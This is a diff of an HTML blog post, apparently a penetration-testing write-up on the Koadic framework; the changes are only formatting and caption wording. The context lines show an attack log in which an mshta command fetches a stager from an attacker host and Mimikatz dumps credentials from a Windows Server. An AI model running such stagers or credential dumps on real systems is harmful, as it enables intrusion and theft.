@@ -183,9 +183,11 @@ When you start using Koadic obviously you need to pip3 the "reqs" and get it set
 </center></p>
 
 <p style="text-align:justify;">
-Once you get an active session (zombie) the fun really begins. Because I had the module set to run Mimikatz immediately on connect you can see that plain-text creds are dumped as soon as the Windows Server 2012 host calls back to my attacking machine. You can see that both a  NTLM hash and plan-text credentials were recovered:</p>
+Once you get an active session (zombie) the fun really begins. Because I had the module set to run Mimikatz immediately on connect you can see that plain-text creds are dumped as soon as the Windows Server 2012 host calls back to my attacking machine. You can see that both a  NTLM hash and plan-text credentials were recovered:
+</p>
 
-<pre><code class="language-bash">(koadic: sta/js/mshta)$ run
+<pre><code class="language-bash">
+(koadic: sta/js/mshta)$ run
 [+] Spawned a stager at http://AttackingIP:9999/sploit
 [!] Dont edit this URL! (See: 'help portfwd')
 [&gt;] mshta http://AttackingIP:9999/sploit
@@ -221,12 +223,10 @@ Username          Domain           Password
 (null)            (null)           (null)
 Administrator     WIN-LKC4723RPHF  (null)
 win-lkc4723rphf\$  WORKGROUP        (null)
-
-
 </code></pre>
 
 <figcaption>
-<center>Dumping Creds on Connection</center>
+<center>Dumping Creds upon Connection</center>
 </figcaption>
 
 <p style="text-align:justify;">
